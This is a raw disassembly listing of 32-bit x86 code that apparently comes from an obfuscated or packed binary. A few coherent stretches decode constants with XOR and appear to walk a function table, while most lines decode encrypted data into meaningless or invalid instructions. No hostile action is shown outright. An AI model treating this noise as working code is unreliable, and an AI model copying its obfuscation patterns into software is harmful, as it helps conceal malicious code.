  40cbab:	aaa    
  40cbac:	xor    DWORD PTR [ecx+0x6aafcb7f],edx
  40cbb2:	in     al,dx
  40cbb3:	mov    ecx,0xce539793
  40cbb8:	lods   al,BYTE PTR ds:[esi]
  40cbb9:	fst    QWORD PTR fs:[ecx-0x6f]
  40cbbd:	dec    esi
  40cbbe:	add    BYTE PTR [edi+eax*4-0x2f8a00b0],ah
  40cbc5:	push   DWORD PTR [ebp+0xc]
  40cbc8:	call   0x410a7f
  40cbcd:	mov    eax,DWORD PTR [ebp-0x4]
  40cbd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40cbd3:	xor    eax,0x7510854
  40cbd8:	add    eax,ebx
  40cbda:	cmp    ecx,eax
  40cbdc:	jne    0x40cbff
  40cbe2:	mov    eax,DWORD PTR [ebp-0x20]
  40cbe5:	inc    edi
  40cbe6:	cmp    edi,eax
  40cbe8:	jb     0x40c413
  40cbee:	jmp    0x40cc0f
  40cbf3:	mov    eax,DWORD PTR [ebp-0x4]
  40cbf6:	xor    eax,esi
  40cbf8:	add    eax,ebx
  40cbfa:	jmp    0x40e33d
  40cbff:	mov    eax,DWORD PTR [ebp-0x2c]
  40cc02:	movzx  eax,WORD PTR [eax+edi*2]
  40cc06:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc09:	mov    eax,DWORD PTR [ecx+eax*4]
  40cc0c:	mov    DWORD PTR [ebp+0xc],eax
  40cc0f:	mov    eax,DWORD PTR [ebp-0x4]
  40cc12:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc15:	xor    eax,0x7510854
  40cc1a:	add    eax,ebx
  40cc1c:	cmp    ecx,eax
  40cc1e:	jne    0x40cf51
  40cc24:	mov    eax,DWORD PTR [ebp-0x4]
  40cc27:	xor    eax,0x7510854
  40cc2c:	jmp    0x40cbf8
  40cc31:	jmp    0x40cf51
  40cc36:	xchg   BYTE PTR [edi-0x6ff40385],dl
  40cc3c:	adc    DWORD PTR [ebp+0x593a5a78],0x5858887d
  40cc46:	and    cl,BYTE PTR [ebx+0x7d7d7e7e]
  40cc4c:	jle    0x40cccc
  40cc4e:	or     esi,DWORD PTR [edx-0x11]
  40cc51:	ja     0x40cbeb
  40cc53:	ret    
  40cc54:	pop    ebp
  40cc55:	and    al,0xb7
  40cc57:	cmc    
  40cc58:	dec    edi
  40cc59:	test   eax,0xa48285ee
  40cc5e:	je     0x40cc71
  40cc60:	mov    al,ds:0x55d9c1cc
  40cc65:	push   ebx
  40cc66:	sub    dl,dl
  40cc68:	mov    ah,BYTE PTR [edi+0x2c]
  40cc6b:	lods   eax,DWORD PTR ds:[esi]
  40cc6c:	ss test eax,0xd7e8d471
  40cc72:	mov    ds:0x993a90c3,eax
  40cc77:	mov    BYTE PTR [ebx+ebx*4-0x2b],ah
  40cc7b:	pop    ds
  40cc7c:	add    DWORD PTR [ebp-0x13],0x7ab0a1d8
  40cc83:	test   DWORD PTR [ebp+0x68],esp
  40cc86:	jmp    0xe7e4:0x1e50e121
  40cc8d:	outs   dx,DWORD PTR ds:[esi]
  40cc8e:	dec    esp
  40cc90:	jmp    0xe9f5806c
  40cc95:	jl     0x40cc99
  40cc97:	cmc    
  40cc98:	mov    ebx,0xd0ed1393
  40cc9d:	jecxz  0x40cc4a
  40cc9f:	loope  0x40ccab
  40cca1:	sbb    DWORD PTR [edx-0x574facf0],0x28bb9226
  40ccab:	ret    0x54f5
  40ccae:	iret   
  40ccaf:	xchg   edx,esp
  40ccb1:	leave  
  40ccb2:	jns    0x40cc48
  40ccb4:	pop    edx
  40ccb5:	jns    0x40cd30
  40ccb7:	cmp    eax,0x7bbbf300
  40ccbc:	imul   esp,DWORD PTR [esi-0x1b966959],0x4186c75c
  40ccc6:	pop    ebx
  40ccc7:	jmp    0x44f7:0xc70a4dbe
  40ccce:	fisub  DWORD PTR [edx]
  40ccd0:	mov    dl,0xc3
  40ccd2:	loopne 0x40cc8e
  40ccd4:	add    eax,0xb2aa508c
  40ccd9:	cmp    bl,BYTE PTR [edi+edi*1]
  40ccdc:	sbb    eax,0x937ccbce
  40cce1:	xor    BYTE PTR [ecx-0x5968872b],dh
  40cce7:	in     al,dx
  40cce8:	cld    
  40cce9:	sbb    al,0x4e
  40cceb:	test   bh,dh
  40cced:	pushf  
  40ccee:	aas    
  40ccef:	aaa    
  40ccf0:	mov    ds:0xc304ffe0,al
  40ccf5:	lea    ebp,[esi+0x285eca85]
  40ccfb:	push   esp
  40ccfc:	mov    ch,0xb9
  40ccfe:	(bad)  
  40ccff:	mov    dh,0x38
  40cd01:	lahf   
  40cd02:	repnz pop ds
  40cd04:	nop
  40cd05:	popa   
  40cd06:	sub    al,0x41
  40cd08:	inc    edi
  40cd09:	stc    
  40cd0a:	adc    edi,DWORD PTR ss:[ecx+0x904752a]
  40cd11:	out    0x35,al
  40cd13:	mov    al,0x99
  40cd15:	rol    DWORD PTR [ecx+ebx*8+0x30],0xa0
  40cd1a:	(bad)  
  40cd1b:	push   ebp
  40cd1c:	cdq    
  40cd1d:	out    dx,eax
  40cd1e:	into   
  40cd1f:	xchg   edi,esi
  40cd21:	(bad)  [edi*2-0x2b34f499]
  40cd28:	mov    esp,0x6f3e8dcf
  40cd2d:	or     dh,BYTE PTR [ebp+edi*8+0x2caae4f9]
  40cd34:	cmp    BYTE PTR [esi+ebp*8],bh
  40cd37:	lea    eax,[ecx-0x60ea8b08]
  40cd3d:	addr16 aaa 
  40cd3f:	sbb    BYTE PTR [edi+0x48],0x45
  40cd43:	cmp    eax,ebx
  40cd45:	cmp    al,BYTE PTR [eax+ecx*4-0x6bdfcd43]
  40cd4c:	sub    al,bh
  40cd4e:	pop    ds
  40cd4f:	shr    ecx,cl
  40cd51:	mov    al,ds:0xb27fbfbc
  40cd56:	xor    bl,BYTE PTR [esi-0x67]
  40cd59:	cmp    BYTE PTR [edx],dl
  40cd5b:	push   eax
  40cd5c:	in     al,dx
  40cd5d:	(bad)  
  40cd5e:	loop   0x40cd9a
  40cd60:	add    DWORD PTR [ecx+0x48d5ed14],0xffffff9f
  40cd67:	dec    ecx
  40cd68:	fwait
  40cd69:	lahf   
  40cd6a:	mov    dl,0x36
  40cd6c:	shr    DWORD PTR [edi+0x7b],1
  40cd6f:	test   BYTE PTR [ecx],bh
  40cd71:	inc    edi
  40cd72:	outs   dx,BYTE PTR ds:[esi]
  40cd73:	xor    al,0x6a
  40cd75:	fbstp  TBYTE PTR [ebp+0x47fba983]
  40cd7b:	sbb    BYTE PTR [edi+ebp*2+0x1],ch
  40cd7f:	es ss adc al,0x1f
  40cd83:	sbb    bl,BYTE PTR [edi+esi*2+0x7a]
  40cd87:	dec    ecx
  40cd88:	jecxz  0x40cdad
  40cd8a:	pop    ebp
  40cd8b:	dec    ebp
  40cd8c:	inc    ecx
  40cd8d:	jg     0x40cd39
  40cd8f:	stos   DWORD PTR es:[edi],eax
  40cd90:	xor    edi,DWORD PTR [ecx-0x67]
  40cd93:	(bad)  
  40cd94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd95:	add    al,0xc9
  40cd97:	lods   al,BYTE PTR ds:[esi]
  40cd98:	xchg   ebx,eax
  40cd99:	inc    DWORD PTR [ebp+0x396fb91f]
  40cd9f:	mov    al,ds:0xc7a06be7
  40cda4:	fstp   DWORD PTR [ebp-0x76e41c38]
  40cdaa:	adc    al,0x6a
  40cdac:	icebp  
  40cdad:	call   0x9955:0x1286b643
  40cdb4:	mov    cl,0xaa
  40cdb6:	xor    eax,0x4413c6
  40cdbb:	push   edx
  40cdbc:	lds    edi,FWORD PTR [ebx+0xacfad19]
  40cdc2:	shr    DWORD PTR [esi+0xd],cl
  40cdc5:	int    0xba
  40cdc7:	dec    ebx
  40cdc8:	ret    0xbf49
  40cdcb:	test   al,0xf3
  40cdcd:	in     al,dx
  40cdce:	fld    TBYTE PTR [ecx+0x55b321ac]
  40cdd4:	aam    0x83
  40cdd6:	mov    ebx,0xea7d75ee
  40cddb:	mov    edi,0xd6838c4
  40cde0:	ins    BYTE PTR es:[edi],dx
  40cde1:	and    dh,0x5c
  40cde4:	add    esi,ebx
  40cde6:	dec    esp
  40cde7:	fldcw  WORD PTR [esi]
  40cde9:	mov    cl,ah
  40cdeb:	xor    bh,dl
  40cded:	clc    
  40cdee:	cmp    eax,0xc9886355
  40cdf3:	jl     0x40cdf1
  40cdf5:	mov    eax,0xab6efbd2
  40cdfa:	jle    0x40ce09
  40cdfc:	and    ch,dh
  40cdfe:	sti    
  40cdff:	cmp    eax,0x563c9f35
  40ce04:	icebp  
  40ce05:	pop    esp
  40ce06:	xor    bl,ch
  40ce08:	fsub   st,st(2)
  40ce0a:	loope  0x40ce51
  40ce0c:	and    eax,DWORD PTR [edi-0x2dd5ecb9]
  40ce12:	dec    eax
  40ce13:	xchg   esp,eax
  40ce14:	ret    
  40ce15:	and    eax,0x4527abf2
  40ce1a:	push   cs
  40ce1b:	add    al,0xd6
  40ce1d:	mov    ss,WORD PTR [edi-0x19df4f74]
  40ce23:	sbb    al,BYTE PTR [ebx+0x53dbdc17]
  40ce29:	inc    esp
  40ce2a:	sbb    al,0x30
  40ce2c:	jmp    0x50bb3c9
  40ce31:	int3   
  40ce32:	cdq    
  40ce33:	dec    ebx
  40ce34:	dec    esi
  40ce35:	and    BYTE PTR [eax],al
  40ce37:	lods   al,BYTE PTR ds:[esi]
  40ce38:	sbb    BYTE PTR [eax+0x21bbfd07],bl
  40ce3e:	popf   
  40ce3f:	retf   
  40ce40:	pop    edi
  40ce41:	stc    
  40ce42:	mov    ecx,0xec712b98
  40ce47:	xchg   edx,eax
  40ce48:	mov    ebp,0x50e1a8bd
  40ce4d:	ja     0x40ce85
  40ce4f:	add    DWORD PTR [edx],0xffffffd4
  40ce52:	jnp    0x40cde2
  40ce54:	fdivr  DWORD PTR [eax]
  40ce56:	fdiv   st,st(6)
  40ce58:	xchg   edx,eax
  40ce59:	das    
  40ce5a:	pop    ebp
  40ce5b:	lea    ebx,[eax-0x36]
  40ce5e:	test   DWORD PTR [ebx],ecx
  40ce60:	ins    DWORD PTR es:[edi],dx
  40ce61:	lds    edi,FWORD PTR [eax+0x47a0f1b9]
  40ce67:	mov    edx,DWORD PTR [edi-0x3c32c0fd]
  40ce6d:	mov    DWORD PTR [ebx+ebp*8],edx
  40ce70:	aad    0x38
  40ce72:	mov    eax,ds:0x3722ceec
  40ce77:	push   eax
  40ce78:	mov    ds:0x5ec8f18f,eax
  40ce7d:	clc    
  40ce7e:	sub    eax,DWORD PTR [edi-0x65bc9ae6]
  40ce84:	add    DWORD PTR [esi+0x6d],eax
  40ce87:	jnp    0x40ce24
  40ce89:	push   ds
  40ce8a:	mov    BYTE PTR [edx-0x2e],bl
  40ce8d:	aaa    
  40ce8e:	adc    DWORD PTR [ebx-0x1c],ebx
  40ce91:	fbld   TBYTE PTR ds:0xacd0cbcb
  40ce97:	xchg   ebp,eax
  40ce98:	dec    ebp
  40ce99:	mov    eax,ds:0x7c83e6e9
  40ce9e:	addr16 enter 0xb14d,0xf1
  40cea3:	fcmovb st,st(3)
  40cea5:	and    al,0xaa
  40cea7:	cdq    
  40cea8:	cs dec esp
  40ceaa:	jb     0x40ce64
  40ceac:	mov    ch,0xcd
  40ceae:	jp     0x40cf00
  40ceb0:	jno    0x40cee0
  40ceb2:	retf   0x27e4
  40ceb5:	bound  ebx,QWORD PTR [edi]
  40ceb7:	or     bh,BYTE PTR [ebp-0x2c]
  40ceba:	call   FWORD PTR [eax-0x4b7ba0d]
  40cec0:	ret    
  40cec1:	or     eax,0x57e51530
  40cec6:	retf   0x47e9
  40cec9:	sbb    cl,BYTE PTR [edi+ebx*1+0x2a]
  40cecd:	fld    TBYTE PTR ds:0x8faee8c0
  40ced3:	lahf   
  40ced4:	(bad)  
  40ced5:	xor    eax,0x5a15765f
  40ceda:	(bad)  
  40cedb:	xor    bh,bh
  40cedd:	cld    
  40cede:	out    dx,eax
  40cedf:	xchg   ebp,eax
  40cee0:	adc    BYTE PTR [esi+0x4e],0xb6
  40cee4:	xchg   ebx,eax
  40cee5:	les    esi,FWORD PTR [eax+0x57]
  40cee8:	xchg   ecx,eax
  40cee9:	jmp    0xebddd760
  40ceee:	iret   
  40ceef:	fiadd  WORD PTR [edx]
  40cef1:	push   esi
  40cef2:	mov    dl,0x1c
  40cef4:	sti    
  40cef5:	imul   ebx,ebp,0xc5b85d7e
  40cefb:	ds call 0xe89f3179
  40cf01:	data16 icebp 
  40cf03:	int    0x5a
  40cf05:	and    bh,bh
  40cf07:	add    DWORD PTR [esi+edi*2+0xb],0x4495dfe7
  40cf0f:	xchg   ebp,eax
  40cf10:	es jo  0x40cebc
  40cf13:	outs   dx,DWORD PTR ds:[esi]
  40cf14:	dec    eax
  40cf15:	cmp    esi,DWORD PTR [ebx+0xf]
  40cf18:	pushf  
  40cf19:	int3   
  40cf1a:	sub    al,0x6b
  40cf1c:	fstp   QWORD PTR [esi-0x4d]
  40cf1f:	ret    0xebb1
  40cf22:	test   DWORD PTR gs:[edx-0x2668ae4],ebp
  40cf29:	pusha  
  40cf2a:	sbb    BYTE PTR [esi+0x19],cl
  40cf2d:	jl     0x40cf78
  40cf2f:	test   al,0x54
  40cf31:	ja     0x40cedf
  40cf33:	lods   eax,DWORD PTR ds:[esi]
  40cf34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf35:	(bad)  
  40cf36:	push   cs
  40cf37:	lods   al,BYTE PTR ds:[esi]
  40cf38:	ror    BYTE PTR [ebx-0x5c4e8381],0xbc
  40cf3f:	outs   dx,DWORD PTR ds:[esi]
  40cf41:	adc    esp,DWORD PTR [ebx+0x7]
  40cf44:	mov    al,ds:0xfa4169a8
  40cf49:	mov    ecx,0xc9125625
  40cf4e:	mov    BYTE PTR [edi],bh
  40cf50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf51:	mov    eax,DWORD PTR [ebp+0xc]
  40cf54:	add    eax,DWORD PTR [ebp+0x8]
  40cf57:	mov    DWORD PTR [ebp-0x10],eax
  40cf5a:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf5d:	test   eax,eax
  40cf5f:	je     0x40dfcf
  40cf65:	mov    DWORD PTR [ebp-0x24],esi
  40cf68:	push   0xb
  40cf6a:	pop    ecx
  40cf6b:	push   0x5
  40cf6d:	dec    ecx
  40cf6e:	jmp    0x40d28e
  40cf73:	test   DWORD PTR [ebx],ebx
  40cf75:	jnp    0x40cfa2
  40cf77:	mov    eax,ds:0x98b1b52b
  40cf7c:	xchg   ecx,eax
  40cf7d:	rcr    dl,0x30
  40cf80:	ins    DWORD PTR es:[edi],dx
  40cf81:	jnp    0x40cfeb
  40cf83:	and    DWORD PTR [esi+0x7d7d7e7e],edx
  40cf89:	jle    0x40d009
  40cf8b:	jns    0x40cf61
  40cf8d:	jp     0x40cfcb
  40cf8f:	mov    ch,0xa7
  40cf91:	adc    DWORD PTR [ebp+0x5614971a],ebx
  40cf97:	jae    0x40cf9c
  40cf99:	mov    ch,0x55
  40cf9b:	(bad)  
  40cf9c:	mov    al,BYTE PTR [edi+ebp*2-0x61]
  40cfa0:	mov    eax,ds:0x23c22823
  40cfa5:	pop    ebx
  40cfa6:	call   0x428d:0x7962f31e
  40cfad:	jle    0x40cf9f
  40cfaf:	imul   ecx,DWORD PTR [ebx+eax*1-0x7b],0x744fe896
  40cfb7:	mov    eax,ds:0x96385d6a
  40cfbc:	test   eax,0x22bbbb31
  40cfc1:	retf   
  40cfc2:	push   ecx
  40cfc3:	mov    ecx,0xcc9269d4
  40cfc8:	push   eax
  40cfc9:	pop    esp
  40cfca:	movaps xmm3,XMMWORD PTR [eax+0x63]
  40cfce:	test   BYTE PTR [eax+edx*8-0x4f],al
  40cfd2:	mov    ah,0x58
  40cfd4:	jnp    0x40cfb2
  40cfd6:	adc    eax,0xd5b1b0a1
  40cfdb:	pop    ebp
  40cfdc:	pusha  
  40cfdd:	in     eax,0x8a
  40cfdf:	dec    ecx
  40cfe0:	fdivr  DWORD PTR [edi+eiz*2+0x7d589f0b]
  40cfe7:	pop    ebx
  40cfe8:	or     DWORD PTR [ecx+0x37faf907],edx
  40cfee:	cmp    DWORD PTR [ecx-0x18],edi
  40cff1:	sbb    al,0x5b
  40cff3:	push   es
  40cff4:	mov    bl,0xf4
  40cff6:	dec    esi
  40cff7:	mov    esi,0x1a3c2d17
  40cffc:	fstp   st(1)
  40cffe:	(bad)  
  40cfff:	imul   esp,DWORD PTR [ebx],0xffffffcc
  40d002:	shl    DWORD PTR [ecx],0x43
  40d005:	sub    DWORD PTR [ecx],0x968894be
  40d00b:	mov    dh,0x61
  40d00d:	(bad)  
  40d00e:	mov    al,ds:0xedc84367
  40d013:	add    eax,0xe2b10c74
  40d018:	xor    DWORD PTR [edi+0x24ff1767],0xffffffca
  40d01f:	sti    
  40d020:	xchg   esi,eax
  40d021:	pushf  
  40d022:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d023:	lea    esp,[ebp-0x49fccef2]
  40d029:	pop    DWORD PTR [ebx-0x33b31907]
  40d02f:	jno    0x40d05e
  40d031:	inc    edx
  40d032:	in     eax,dx
  40d033:	and    bh,bl
  40d035:	inc    edx
  40d036:	loopne 0x40d06b
  40d038:	sub    eax,0xff63cf83
  40d03d:	and    esi,DWORD PTR [esi-0x12]
  40d040:	lea    edx,[ecx]
  40d042:	mov    cs,WORD PTR [edx+0x58]
  40d045:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d046:	push   edi
  40d047:	mov    edx,0xd605106e
  40d04c:	push   ebx
  40d04d:	test   eax,0x4371f8b8
  40d052:	or     esp,DWORD PTR [esi+0x583a4e5a]
  40d058:	and    al,0x9
  40d05a:	lods   eax,DWORD PTR ds:[esi]
  40d05b:	retf   0xe240
  40d05e:	loop   0x40d0cb
  40d060:	not    ah
  40d062:	test   BYTE PTR [ebp+0x13],ah
  40d065:	das    
  40d066:	sub    cl,BYTE PTR gs:[esi-0x7e594ded]
  40d06d:	cli    
  40d06e:	dec    eax
  40d06f:	pop    eax
  40d070:	push   esi
  40d071:	jne    0x40d009
  40d073:	pop    ss
  40d074:	jb     0x40d0f1
  40d076:	jae    0x40d097
  40d078:	outs   dx,BYTE PTR ds:[esi]
  40d079:	mov    ch,0x95
  40d07b:	xor    eax,0x3ed9b2dc
  40d080:	(bad)  
  40d081:	jmp    0xdb8f12f
  40d086:	mov    DWORD PTR [ebx],esp
  40d088:	test   DWORD PTR [esi],ebx
  40d08a:	repz inc ecx
  40d08c:	mov    eax,ds:0x6b41f893
  40d091:	in     al,dx
  40d092:	push   esi
  40d093:	lods   al,BYTE PTR ds:[esi]
  40d094:	jl     0x40d06f
  40d096:	fwait
  40d097:	cmp    ebx,DWORD PTR [edx-0x1b]
  40d09a:	loopne 0x40d090
  40d09c:	xor    eax,0xdb3c4e72
  40d0a1:	cwde   
  40d0a2:	int3   
  40d0a3:	loope  0x40d035
  40d0a5:	daa    
  40d0a6:	inc    esi
  40d0a7:	scas   al,BYTE PTR es:[edi]
  40d0a8:	(bad)  
  40d0a9:	jg     0x40d0b7
  40d0ab:	cwde   
  40d0ac:	lahf   
  40d0ad:	inc    esi
  40d0ae:	stos   BYTE PTR es:[edi],al
  40d0af:	sbb    eax,0x397326ec
  40d0b4:	gs out dx,eax
  40d0b6:	xchg   esp,eax
  40d0b7:	push   ebx
  40d0b8:	mov    ah,BYTE PTR [esi-0x5b5aca67]
  40d0be:	ficomp DWORD PTR [ebp+ebp*1-0x19189343]
  40d0c5:	and    al,0xd6
  40d0c7:	mov    ch,BYTE PTR [eax+0x74]
  40d0ca:	sub    eax,0x29c435b1
  40d0cf:	xor    al,0x9
  40d0d1:	mov    ebp,0xcd1ee9e9
  40d0d6:	test   eax,0xd58b7fc8
  40d0db:	test   BYTE PTR [ecx-0x3e],dl
  40d0de:	add    eax,0xa954c740
  40d0e3:	mov    bh,0xbe
  40d0e5:	daa    
  40d0e6:	or     ebx,DWORD PTR [ecx-0x67]
  40d0e9:	int3   
  40d0ea:	push   cs
  40d0eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0ec:	sbb    BYTE PTR [ebx+0xf4fe2b9],cl
  40d0f2:	push   es
  40d0f3:	mov    eax,0xea6e93f3
  40d0f8:	mov    cl,0xb4
  40d0fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0fb:	ficom  DWORD PTR [esp+edi*1+0x2e]
  40d0ff:	in     eax,0x2f
  40d101:	mov    edi,0x7b3df6c4
  40d106:	cs scas al,BYTE PTR es:[edi]
  40d108:	and    al,0x10
  40d10a:	(bad)  
  40d10b:	mov    esp,0x9c86384c
  40d110:	pushf  
  40d111:	das    
  40d112:	cmp    eax,esi
  40d114:	gs sbb eax,0x81442ee0
  40d11a:	fdivp  st(3),st
  40d11c:	add    eax,esi
  40d11e:	popa   
  40d11f:	jl     0x40d188
  40d121:	pop    ds
  40d122:	loope  0x40d18d
  40d124:	adc    eax,0xc67fc11c
  40d129:	(bad)  
  40d12a:	fmul   st(7),st
  40d12c:	stos   DWORD PTR es:[edi],eax
  40d12d:	repz inc ebx
  40d12f:	stos   BYTE PTR es:[edi],al
  40d130:	sub    eax,0x6e3a90e2
  40d135:	cmp    ch,BYTE PTR [edi+ebp*8]
  40d138:	test   al,0xcf
  40d13a:	jge    0x40d0ca
  40d13c:	sub    DWORD PTR [edi+0x22c6f8e9],edx
  40d142:	jne    0x40d144
  40d144:	loop   0x40d0d5
  40d146:	xlat   BYTE PTR ds:[ebx]
  40d147:	jno    0x40d1b5
  40d149:	mov    esi,0x62ab2d8d
  40d14e:	je     0x40d0d1
  40d150:	adc    DWORD PTR [ebx-0x38b60ff1],esi
  40d156:	mov    ds:0x16c49d3d,eax
  40d15b:	test   BYTE PTR [ecx],al
  40d15d:	mov    ebp,0x255308c5
  40d162:	iret   
  40d163:	xor    eax,DWORD PTR [ebx+eiz*8-0x3cbac5f4]
  40d16a:	or     BYTE PTR [eax-0x48bd55c9],al
  40d170:	jle    0x40d1a1
  40d172:	sub    al,0xfe
  40d174:	lods   eax,DWORD PTR ds:[esi]
  40d175:	jns    0x40d106
  40d177:	leave  
  40d178:	dec    edi
  40d179:	fs pop esp
  40d17b:	adc    edx,0x33dc530e
  40d181:	inc    eax
  40d182:	adc    ch,ah
  40d184:	sub    eax,0x421b1789
  40d189:	imul   ebp,ebp,0xd
  40d18c:	adc    esp,ecx
  40d18e:	and    al,0xc1
  40d190:	lock xchg esp,eax
  40d192:	fiadd  DWORD PTR [eax]
  40d194:	inc    esi
  40d195:	xor    esp,eax
  40d197:	(bad)  
  40d198:	repnz lea esp,[ebp+ecx*2+0x420e237a]
  40d1a0:	xor    dh,dl
  40d1a2:	xchg   edi,eax
  40d1a3:	jge    0x40d208
  40d1a5:	or     al,0xb0
  40d1a7:	inc    esi
  40d1a8:	lods   al,BYTE PTR ds:[esi]
  40d1a9:	div    BYTE PTR gs:[eax+0x2f]
  40d1ad:	push   esp
  40d1ae:	sbb    al,0xd3
  40d1b0:	cmp    al,cl
  40d1b2:	jge    0x40d1d1
  40d1b4:	inc    edi
  40d1b5:	pop    ebp
  40d1b6:	cmp    BYTE PTR [edx*1-0x7bb57613],bh
  40d1bd:	lock jnp 0x40d1ae
  40d1c0:	das    
  40d1c1:	push   0x6fa9e432
  40d1c6:	mov    ds:0x336f8f33,eax
  40d1cb:	call   0xafd7:0x82e7bdb4
  40d1d2:	push   esi
  40d1d3:	adc    al,0xff
  40d1d5:	dec    edx
  40d1d6:	dec    ecx
  40d1d7:	es xchg dh,dh
  40d1da:	mov    bh,0x7e
  40d1dc:	xor    al,0xb8
  40d1de:	pop    ds
  40d1df:	jg     0x40d1cb
  40d1e1:	hlt    
  40d1e2:	mov    ch,0xfd
  40d1e4:	popa   
  40d1e5:	xor    al,0x77
  40d1e7:	lock jb 0x40d175
  40d1ea:	out    dx,eax
  40d1eb:	dec    edi
  40d1ec:	mov    ecx,0xa54e081a
  40d1f1:	outs   dx,DWORD PTR ds:[esi]
  40d1f2:	sub    eax,0xfdefcde
  40d1f7:	push   es
  40d1f8:	enter  0x973b,0xe5
  40d1fc:	jbe    0x40d1aa
  40d1fe:	imul   ebx,ecx,0xf7a01fc3
  40d204:	or     DWORD PTR [eax+0x62f11dd7],ebp
  40d20a:	push   ebp
  40d20b:	lahf   
  40d20c:	cmp    eax,0x8ab5afcf
  40d211:	sub    dh,dh
  40d213:	pop    ds
  40d214:	sti    
  40d215:	int    0x9d
  40d217:	mov    cl,0x27
  40d219:	pop    es
  40d21a:	push   es
  40d21b:	or     BYTE PTR [eax+0x2e11cb75],dl
  40d221:	and    al,0xf
  40d223:	shl    DWORD PTR [eax],0xf0
  40d226:	fnstcw WORD PTR [ebx]
  40d228:	push   ss
  40d229:	int3   
  40d22a:	and    ch,BYTE PTR [eax+eiz*8-0x63fd6630]
  40d231:	ret    
  40d232:	ins    BYTE PTR es:[edi],dx
  40d233:	mov    eax,0x59d4b38b
  40d238:	out    dx,eax
  40d239:	pop    ds
  40d23a:	push   ds
  40d23b:	cmp    esp,DWORD PTR [ecx-0x496de5a4]
  40d241:	stos   DWORD PTR es:[edi],eax
  40d242:	neg    BYTE PTR [ecx+0x64]
  40d245:	and    al,0xde
  40d247:	lods   eax,DWORD PTR ds:[esi]
  40d248:	jbe    0x40d1d4
  40d24a:	jg     0x40d251
  40d24c:	xchg   ebp,eax
  40d24d:	cwde   
  40d24e:	mov    ebx,0x98661f43
  40d253:	fdiv   DWORD PTR [esi]
  40d255:	lods   eax,DWORD PTR ds:[esi]
  40d256:	sub    al,0x4b
  40d258:	pop    ds
  40d259:	xor    bl,bl
  40d25b:	mov    bl,0xbc
  40d25d:	int3   
  40d25e:	or     eax,0xdef75bc7
  40d263:	in     al,0x26
  40d265:	loopne 0x40d24b
  40d267:	or     eax,0x99204ffe
  40d26c:	lea    edx,[esi-0x11]
  40d26f:	push   0xffffffae
  40d271:	add    dl,ah
  40d273:	js     0x40d223
  40d275:	mov    dl,BYTE PTR [edx+0x36]
  40d278:	xor    BYTE PTR [edx-0x63297a0a],ch
  40d27e:	stos   BYTE PTR es:[edi],al
  40d27f:	and    edx,esp
  40d281:	dec    edi
  40d282:	push   ss
  40d283:	ror    DWORD PTR [edx+0x7d4cbcfd],cl
  40d289:	jbe    0x40d2c6
  40d28b:	arpl   WORD PTR [eax+0x6d],bp
  40d28e:	pop    ebx
  40d28f:	xchg   ebx,ecx
  40d291:	sub    ebx,ecx
  40d293:	xchg   ebx,ecx
  40d295:	dec    ecx
  40d296:	mov    eax,DWORD PTR [ebp-0x1c]
  40d299:	imul   eax,ecx
  40d29c:	sub    esp,eax
  40d29e:	mov    DWORD PTR [ebp-0x24],esp
  40d2a1:	mov    eax,DWORD PTR [ebp-0x4]
  40d2a4:	mov    ecx,0x7510854
  40d2a9:	xor    eax,ecx
  40d2ab:	mov    edx,0x32729b
  40d2b0:	add    eax,edx
  40d2b2:	mov    DWORD PTR [ebp+0x8],eax
  40d2b5:	mov    eax,DWORD PTR [ebp-0x18]
  40d2b8:	xor    eax,ecx
  40d2ba:	add    eax,edx
  40d2bc:	mov    edx,DWORD PTR [ebp+0x14]
  40d2bf:	jmp    0x40d5df
  40d2c4:	xor    ch,cl
  40d2c6:	xor    DWORD PTR [ecx+0x69b241f1],eax
  40d2cc:	xor    esi,ebx
  40d2ce:	pop    ecx
  40d2d0:	(bad)
  40d2d3:	cmp    al,0x2c
  40d2d5:	xchg   ebp,eax
  40d2d6:	jle    0x40d356
  40d2d8:	jge    0x40d357
  40d2da:	jle    0x40d35a
  40d2dc:	cwde   
  40d2dd:	sub    eax,0xc91c81a0
  40d2e2:	int3   
  40d2e3:	jo     0x40d363
  40d2e5:	int    0x94
  40d2e7:	add    eax,0xc5fb6b30
  40d2ec:	dec    ebp
  40d2ed:	sbb    BYTE PTR [ecx-0x35b12f13],0xf
  40d2f4:	jnp    0x40d2dd
  40d2f6:	lods   al,BYTE PTR ds:[esi]
  40d2f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2f8:	sbb    DWORD PTR [edx],0xffffffcc
  40d2fb:	pop    es
  40d2fc:	(bad)  
  40d2fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2fe:	jnp    0x40d35e
  40d300:	clc    
  40d301:	cmp    bl,BYTE PTR [eax-0x3f0c992a]
  40d307:	ret    0x6e37
  40d30a:	sub    eax,0xc52658dc
  40d30f:	dec    edx
  40d310:	jns    0x40d2e6
  40d312:	jb     0x40d2e4
  40d314:	mov    edx,0xe294124b
  40d319:	mov    ebx,0x173113ba
  40d31e:	mov    esp,DWORD PTR [eax+0x5a]
  40d321:	jmp    0x9efd:0xd846bbf6
  40d328:	xlat   BYTE PTR gs:[ebx]
  40d32a:	and    al,0xd0
  40d32c:	hlt    
  40d32d:	push   ecx
  40d32e:	jno    0x40d345
  40d330:	or     BYTE PTR ds:0x53c4db13,dh
  40d336:	(bad)  
  40d337:	sbb    eax,0xd289fbac
  40d33c:	fstp   DWORD PTR [edi+ebx*4]
  40d33f:	call   0x9e4e:0xd53ffa6c
  40d346:	xor    al,0xb3
  40d348:	in     al,dx
  40d349:	push   es
  40d34a:	in     eax,dx
  40d34b:	dec    esi
  40d34c:	scas   eax,DWORD PTR es:[edi]
  40d34d:	sbb    BYTE PTR [edx],ah
  40d34f:	push   ecx
  40d350:	call   0x7fae04ed
  40d355:	jbe    0x40d35a
  40d357:	mov    bl,0x40
  40d359:	ror    DWORD PTR [edi-0x7f2937a1],1
  40d35f:	je     0x40d3a1
  40d361:	ret    0xc695
  40d364:	iret   
